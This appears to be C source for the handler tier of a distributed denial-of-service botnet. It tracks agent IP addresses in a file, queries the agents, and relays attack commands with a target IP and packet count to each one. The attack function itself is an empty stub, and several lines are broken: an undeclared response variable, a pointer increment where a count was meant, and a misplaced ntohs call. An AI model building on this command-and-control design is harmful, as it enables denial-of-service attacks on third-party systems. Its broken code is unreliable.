#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "net_sockets.h"
#include "ddos.h"

#define HANDLER_VERSION 1
#define AGENTS_FILE "agents.txt"
#define TMP_FILE "tmp"
#define ERROR -1

typedef int (*action_cb_t)(int sock, char *ip, void *data);
static int for_each_agent(int sock, action_cb_t action_cb,
        void *action_data)
{
    FILE *fp, *tmp = NULL;
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    char ip[INET_ADDRSTRLEN] = {};

    fp = fopen(AGENTS_FILE, "r");
    if (fp == NULL)
    {
        fprintf(stderr, "Could not open agents file \"%s\".\n", AGENTS_FILE);
        goto Error;
    }

    tmp = fopen(TMP_FILE, "w");
    if (tmp == NULL)
    {
        fprintf(stderr, "Could not create temporary file \"%s\".\n", TMP_FILE);
        goto Error;
    }

    while ((read = getline(&line, &len, fp)) != ERROR)
    {
        strncpy(ip, line, read - 1);
        action_cb(sock, ip, action_data);
    }
    remove(AGENTS_FILE);
    rename(TMP_FILE, AGENTS_FILE);

    fclose(fp);
    fclose(tmp);

    return 0;

Error:
    if (fp)
        fclose(fp);
    if (tmp)
        fclose(tmp);
    free(line);

    return ERROR;
}

static int check_agent(int sock, char *ip, void *data)
{
    int rv, clt_sock = create_socket(DDOS_HANDL_CLT_PORT, 1000);
    int *agents = data;
    ddos_request_t req = {};
    req.cmd = htons(DDOS_CMD_INTERROGATE_AGENTS);

    rv = send_data(clt_sock, &resp, sizeof(ddos_responce_t),
            ip, DDOS_AGENT_SRV_PORT);
    if (rv > 0 && ntohs(resp.status == DDOS_OK))
        *agents++;

    return 0;
}

static int add_agent(int sock, char *ip)
{
    ddos_responce_t resp;
    int is_agent_viable = 0;

    check_agent(sock, ip, &is_agent_viable);

    if (!is_agent_viable)
        return 1;

    return 0;
}

static int attack(int sock, char* ip, void *data)
{
    return 0;
}

int main(void)
{
    int sock, agents = 0;
    ddos_request_t req;
    ddos_responce_t resp;
    ddos_cmd_t cmd;
    attack_data_t attack_data = {};

    char ip[INET_ADDRSTRLEN];

    sock = create_socket(DDOS_HANDL_SRV_PORT, 0); 


    while (1)
    {
        memset(&req, 0, sizeof(ddos_request_t));
        memset(&resp, 0, sizeof(ddos_responce_t));

        recv_data(sock, &req, sizeof(ddos_request_t), ip); 

        cmd = ntohs(req.cmd);
        switch (cmd)
        {
            case DDOS_CMD_ADD_AGENT:
                resp.data = htons(HANDLER_VERSION);
                if (!add_agent(sock, req.ip))
                    resp.status = htons(DDOS_OK);
                else
                    resp.status = htons(DDOS_ERROR);
                break;

            case DDOS_CMD_INTERROGATE_HANDLER:
                resp.data = htons(HANDLER_VERSION);
                break;
            case DDOS_CMD_INTERROGATE_AGENTS:
                for_each_agent(sock, check_agent, &agents);
                resp.data = htons(agents);
                break;
            case DDOS_CMD_ATTACK:
                attack_data.target_ip = req.ip;
                attack_data.pkts = req.pkts;
                for_each_agent(sock, attack, &attack_data);
                resp.status = htons(DDOS_OK);
                break;
            default:
                break;
        }

        send_data(sock, &resp, sizeof(ddos_responce_t), ip, DDOS_CTRL_CLT_PORT);
    }

    destroy_socket(sock);
    return 0;
}
